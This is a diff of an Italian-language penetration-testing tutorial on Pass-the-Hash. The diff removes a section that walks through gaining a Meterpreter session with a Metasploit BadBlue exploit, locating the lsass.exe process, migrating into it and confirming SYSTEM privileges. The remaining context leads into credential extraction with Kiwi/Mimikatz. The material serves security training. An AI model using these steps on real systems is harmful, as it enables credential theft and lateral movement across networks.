@@ -4,30 +4,6 @@ Il Pass-the-Hash (PtH) è una tecnica che consente di autenticarsi su un sistema
 
 La capacità di catturare un hash NTLM è quindi fondamentale: esso rappresenta la “firma” digitale della password, e può essere utilizzato per ottenere l’accesso a risorse di rete, spostarsi lateralmente all'interno dell'infrastruttura e perfino compromettere interi domini Active Directory. A differenza delle password in chiaro, **gli hash NTLM spesso non vengono ruotati regolarmente** e, una volta ottenuti, **rimangono validi per lunghi periodi**, specialmente se associati ad account amministrativi.
 
-## Sfruttamento con Metasploit
-
-Un exploit utile per avviare un attacco iniziale è:
-
-`use exploit/windows/http/badblue_passthru`
-
-Dopo l’esecuzione e l’apertura di una sessione Meterpreter, si cerca il processo `lsass.exe` (Local Security Authority Subsystem Service), responsabile della gestione delle autenticazioni sul sistema. È proprio all'interno della memoria di questo processo che vengono archiviati gli hash NTLM e le credenziali in chiaro.
-
-Puoi identificare il processo LSASS con:
-
-`ps | grep lsass`
-
-Una volta ottenuto il PID, si migra il payload di Meterpreter dentro LSASS:
-
-`migrate <PID>`
-
-Verifica che l’utente corrente abbia privilegi SYSTEM con:
-
-`getuid`
-
-Il risultato atteso dovrebbe essere:
-
-`Server username: NT AUTHORITY\SYSTEM`
-
 ## Estrazione credenziali con Kiwi/Mimikatz
 
 Carica il modulo `kiwi` nella sessione Meterpreter attiva (ora migrata in LSASS):
